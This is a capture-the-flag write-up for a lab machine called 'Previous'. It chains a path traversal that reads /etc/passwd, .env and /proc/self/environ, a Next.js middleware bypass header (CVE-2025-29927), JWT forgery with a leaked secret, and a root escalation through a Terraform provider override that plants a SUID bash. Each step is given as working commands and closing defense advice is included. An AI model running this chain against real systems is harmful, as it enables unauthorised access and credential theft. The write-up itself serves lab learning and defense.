## Introduction

“Previous” is a modern Linux/Next.js CTF machine mimicking a DevOps environment prone to real-world web and infrastructure misconfigurations. The machine combines custom app logic, advanced JWT manipulation, a dangerous Terraform privilege escalation flaw, and multiple bypass vectors. This writeup assumes strong familiarity with modern web app assessment and privilege escalation on Linux, and it includes ZAP usage as part of the recon chain.

## Reconnaissance

## 1\. Network Scanning

Comprehensive service discovery reveals:

```plaintext
nmap -sC -sV -p- -T4 10.10.11.83 -oN nmap.txt
```

* 22/tcp: OpenSSH 8.9p1 (Ubuntu)
    
* 80/tcp: nginx 1.18.0 serving Next.js app
    

ZAP/WhatWeb web scan:

* Server: nginx (Ubuntu), Technology: Next.js
    
* Identified email in response: [jeremy@previous.htb](mailto:jeremy@previous.htb)
    

## Application Enumeration

## 2\. Path Traversal Discovery with ZAP

Using OWASP ZAP active scan on [http://previous.htb/](http://previous.htb/) revealed a critical path traversal vulnerability:

* Vulnerable endpoint:
    

```plaintext
/api/download?example=somefile.zip
```

ZAP’s Alert:

```plaintext
Path Traversal (High) at /api/download
Parameter: example
```

Manual confirmation exploiting LFI:

```plaintext
curl -s "http://previous.htb/api/download?example=../../../../../../etc/passwd"
```

* Returned `/etc/passwd`, confirming file read outside intended directory.
    

## Authentication & Middleware Bypass

## 3\. Exploiting CVE-2025–29927 (Next.js Auth Bypass)

Testing HTTP headers revealed that crafting the following allows bypass of custom Next.js middleware using the path traversal endpoint:

```plaintext
curl -s 'http://previous.htb/api/download?example=../../../../../../app/.env' \
 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

* This header disables Next.js middleware enforcement on protected routes (CVE-2025–29927), allowing unauthenticated LFI to protected files.
    

## 4\. Sensitive Data Exfiltration

## Environment Leak

```plaintext
curl -s 'http://previous.htb/api/download?example=../../../../../../proc/self/environ' \
 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' | tr '\0' '\n'
```

Critical variables:

* `PWD=/app`
    
* `HOME=/home/nextjs`
    
* `NODE_VERSION=18.20.8`
    
## Extracting Authentication Secret

```plaintext
curl -s 'http://previous.htb/api/download?example=../../../../../../app/.env' \
 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

* Extracted: `NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a`
    

## JWT Forgery for Privilege Escalation

## 5\. Crafting a Valid JWT for NextAuth

Observation: Standard JWT with only name/email rejected by /api/download (needed specific claims: sub, iat, exp).

One-liner for a valid JWT:

```plaintext
import jwt, time
payload = {
    "name": "jeremy",
    "email": "jeremy@previous.htb",
    "sub": "1",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}
print(jwt.encode(payload, "82a464f1c3509a81d5c973c31a23c61a", algorithm="HS256"))
```

* Use the output JWT as a cookie on all authenticated requests.
    

Command usage:

```plaintext
curl -v "http://previous.htb/" \
  -H "Cookie: next-auth.session-token=<JWT_HERE>"
```

## Locating Hardcoded Credentials (Reverse Engineering the App)

## 6\. Dumping Next.js Compiled Manifests & API Handler

Reveal available API routes:

```plaintext
curl -s 'http://previous.htb/api/download?example=../../../../../../app/.next/routes-manifest.json' \
 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'
```

Map API endpoint to handler:

* `/api/auth/[...nextauth]` → `/app/.next/server/pages/api/auth/[...nextauth].js`
    

Download the handler:

```plaintext
curl -s 'http://previous.htb/api/download?example=../../../../../../app/.next/server/pages/api/auth/%5B...nextauth%5D.js' \
 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -o nextauth.js
```

Grep for credential logic (CredentialsProvider):

```plaintext
grep -iE 'jeremy|password|credential|authorize' nextauth.js | head -n 50
```

Logic:

```plaintext
authorize: async e =>
  e?.username === "jeremy" &&
  e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
    ? { id: "1", name: "Jeremy" }
    : null
```

* .env contained no ADMIN\_SECRET, so fallback applies.
    

## Foothold: SSH as Jeremy

SSH Credentials Discovered:

* Username: jeremy
    
* Password: MyNameIsJeremyAndILovePancakes
    

SSH access:

```plaintext
ssh jeremy@10.10.11.83
```

User flag:

```plaintext
cat ~/user.txt
# 3df44778[...redacted...]
```

## Post-Exploitation: Root Privilege Escalation

## 7\. Sudo Analysis & Terraform Abuse

Sudo rights:

```plaintext
sudo -l
```

* Output: (root) /usr/bin/terraform -chdir=/opt/examples apply — as root.
    

Reviewing /opt/examples/main.tf:

```plaintext
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}
# ... variables, provider, resource...
```

* Uses a custom provider; points to /root/examples/hello-world.ts (no write, but we can override provider!)
    

## 8\. Terraform Provider Development Override Privesc

Abuse: Custom provider loading via TF\_CLI\_CONFIG\_FILE for plugin override

1. Create fake provider:
    

```plaintext
cat <<'EOF' > /tmp/terraform-provider-examples
```

```plaintext
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
EOF
chmod +x /tmp/terraform-provider-examples
```

````plaintext
2. **Write override RC file:**
```bash
cat <<'EOF' > /tmp/terraform.rc
provider_installation {
dev_overrides {
 "previous.htb/terraform/examples" = "/tmp"
}
direct {}
}
EOF
export TF_CLI_CONFIG_FILE=/tmp/terraform.rc
````

Run Terraform as sudo (no extra flags!):

```plaintext
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

* At prompt: `yes`
    

Spawn SUID-root bash:

```plaintext
/tmp/rootbash -p
```

Capture root flag:

```plaintext
cat /root/root.txt
# 3d3258a2[...redacted...]
```

## Defense Recommendations

* Patch Next.js: Ensure all auth middleware is updated and CVE-2025–29927 is patched.
    
* Harden API input validation: Implement strict path validation and generic error responses for download endpoints.
    
* Separate secrets: Do not store app secrets and root cloud infra privileges together.
    
* Restrict plugin development overrides: Block TF\_CLI\_CONFIG\_FILE overrides for production sudoable terraform.
    
* Minimal sudoers rules: Only allow required binaries with strict parameters, never provider/plugin replacement.
    

## Conclusion

This assessment demonstrates full compromise via chained web → app → infrastructure flaws, including a real-world ZAP-discoverable vuln, Next.js/JWT auth bypass, and advanced Terraform privesc using dev overrides. Every step is backed by practical commands and technical reasoning suitable for advanced purple/blue team discussions or red team reporting.

Flags redacted for integrity. All work conducted in legal CTF context.
